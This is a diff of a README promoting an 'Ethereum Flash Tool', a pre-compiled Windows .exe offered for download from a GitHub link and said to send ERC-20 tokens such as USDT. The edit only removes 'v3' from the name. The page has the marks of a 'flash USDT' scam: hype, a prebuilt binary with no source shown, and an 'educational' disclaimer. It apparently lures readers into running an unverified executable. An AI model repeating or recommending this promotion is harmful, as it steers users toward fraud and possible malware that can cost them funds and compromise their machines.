@@ -1,6 +1,6 @@
-### Ethereum Flash Tool v3 🚀 (For Windows)
+### Ethereum Flash Tool 🚀 (For Windows)
 
-Ethereum Flash Tool v3 is a standalone, Windows-compatible `.exe` application engineered for seamless interaction with the Ethereum blockchain 🌐. Leveraging `tkinter` for its GUI and `web3.py` for blockchain connectivity, this tool empowers users to execute ERC-20 token transactions (USDT, USDC, DAI) with precision and ease. Pre-compiled for instant deployment, it eliminates the need for Python or dependency setup—perfect for developers, blockchain enthusiasts, or anyone eager to dive into Ethereum’s ecosystem hands-on. Download it now and take control of your transactions! ⚡
+Ethereum Flash Tool is a standalone, Windows-compatible `.exe` application engineered for seamless interaction with the Ethereum blockchain 🌐. Leveraging `tkinter` for its GUI and `web3.py` for blockchain connectivity, this tool empowers users to execute ERC-20 token transactions (USDT, USDC, DAI) with precision and ease. Pre-compiled for instant deployment, it eliminates the need for Python or dependency setup—perfect for developers, blockchain enthusiasts, or anyone eager to dive into Ethereum’s ecosystem hands-on. Download it now and take control of your transactions! ⚡
 
 **[Download the Latest Release](https://github.com/ethflasher/ETH-flash-USDT/blob/main/Flashing.exe)**
 
@@ -39,4 +39,4 @@ This tool is designed to demystify Ethereum transactions by providing a practica
 
 **Disclaimer**: Intended for educational purposes—use responsibly. Ensure sufficient ETH for gas and verify recipient addresses to prevent fund loss.
 
-Ready to explore Ethereum transactions? [Download Ethereum Flash Tool v3](https://github.com/ethflasher/ETH-flash-USDT/blob/main/Flashing.exe) and start building your blockchain expertise now! Contributions and issues welcome 🌈.
+Ready to explore Ethereum transactions? [Download Ethereum Flash Tool](https://github.com/ethflasher/ETH-flash-USDT/blob/main/Flashing.exe) and start building your blockchain expertise now! Contributions and issues welcome 🌈.
